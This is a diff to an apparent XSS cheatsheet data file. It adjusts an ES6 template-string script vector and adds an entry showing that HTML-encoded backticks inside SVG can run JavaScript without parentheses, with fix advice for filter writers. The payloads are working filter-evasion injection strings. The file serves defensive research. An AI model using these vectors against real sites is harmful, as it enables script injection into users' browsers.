@@ -4960,7 +4960,7 @@ return [
             'de'    : '',
             'zh'    : ''
         },
-        'data'      : '<script>\r\n%js_alert_template%\r\nvar something = `abc${%js_alert%}def`\r\n``.constructor.constructor`%js_esc_template%```</script>',
+        'data'      : '<script>\r\n%js_alert_template%\r\nvar something = `abc${%js_alert%}def`\r\n``.constructor.constructor`%js_esc_template%```\r\n</script>',
         'description' : {
             'en'    : 'ES6 specifies a new language feature called "Template Strings" (often also referred to as "Quasi Literals" alongside multi-line strings and others). This allows to execute arbitrary JavaScript code without using parenthesis but back-ticks instead. Inside back-tick delimited strings, placeholders such as ${} can wrap executable code.',
             'ja'    : '',
@@ -4987,6 +4987,45 @@ return [
         },
         'tags'      : ['es6', 'javascript', 'backtick', 'template'],
         'reporter'  : '.mario'
-    }      
+    },
+    { /* ID 141 - Executing JavaScript using ES6 Template Strings in SVG  */
+        'id'        : 141,
+        'category'  : 'svg',
+        'name'      : {
+            'en'    : 'Executing JavaScript using ES6 Template Strings in SVG',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : '',
+            'zh'    : ''
+        },
+        'data'      : '<svg><script>\ralert&DiacriticalGrave;1&DiacriticalGrave;\r<p>\r\r<svg><script>\ralert&grave;1&grave;\r<p>',
+        'description' : {
+            'en'    : 'The new language features shown in #140 can also be used in the context of an SVG image. Here, the named entity of the back-tick, the &DiacriticalGrave; can be used to initiate execution of a function or method.',
+            'ja'    : '',
+            'ru'    : '', 
+            'cs'    : '',
+            'de'    : '',
+            'zh'    : ''
+        },
+        'urls'      : [
+                        'http://tc39wiki.calculist.org/es6/template-strings/',
+                        'https://html5sec.org/es6/template',
+                        'http://wiki.ecmascript.org/doku.php?id=harmony:quasis'
+                    ],
+        'howtofix'  : {
+            'en'    : 'Make sure that your IDS, filter and other protective systems are aware of the fact, that in SVG, HTML-encoded back-ticks (U+0060) are now capable of initiating execution of methods and functions in JavaScript.',
+            'ja'    : '',
+            'ru'    : '',
+            'cs'    : '',
+            'de'    : '',
+            'zh'    : ''
+        },
+        'browsers'  : {
+            'firefox' : ['34.0']
+        },
+        'tags'      : ['es6', 'javascript', 'backtick', 'template', 'svg'],
+        'reporter'  : '.mario'
+    }    
 ]
 }));
